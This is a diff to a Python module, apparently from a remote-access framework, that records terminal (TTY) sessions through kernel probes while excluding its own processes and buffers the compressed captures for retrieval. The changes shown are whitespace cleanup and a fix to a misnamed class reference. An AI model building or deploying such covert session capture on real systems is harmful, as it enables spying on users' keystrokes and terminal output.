@@ -41,7 +41,7 @@ class Kallsyms(object):
 class TTYMon(object):
     def __init__(self, probe_name='ttymon', ignore=[]):
         self.validate()
-        
+
         kallsyms = Kallsyms()
 
         self._ignore = [ignore] if type(ignore) is int else ignore
@@ -211,7 +211,7 @@ class TTYMon(object):
 
 class TTYRec(Task):
     __slots__ = ( '_ttymon', '_results_lock', '_state' )
-    
+
     def __init__(self, manager):
         super(TTYRec, self).__init__(manager)
         self._ttymon = TTYMon(ignore=[os.getpid(), os.getppid()])
@@ -233,7 +233,7 @@ class TTYRec(Task):
     @property
     def results(self):
         result = None
-        
+
         with self._results_lock:
             if not self._dirty:
                 return None
@@ -243,7 +243,7 @@ class TTYRec(Task):
                 self._buffer.append(packet)
             except zlib.error:
                 pass
-            
+
             result = self._buffer
             self._buffer = Buffer()
             self._compressor = zlib.compressobj(9)
@@ -262,11 +262,11 @@ class TTYRec(Task):
 
 def start():
     try:
-        if manager.active(USniper):
+        if manager.active(TTYRec):
             return False
     except:
         try:
-            manager.stop(USniper)
+            manager.stop(TTYRec)
         except:
             pass
 
@@ -279,7 +279,7 @@ def dump():
     ttyrec = manager.get(TTYRec)
     if ttyrec:
         return ttyrec.results
-        
+
 if __name__ == '__main__':
     mon = TTYMon(ignore=[os.getpid(), os.getppid()])
 
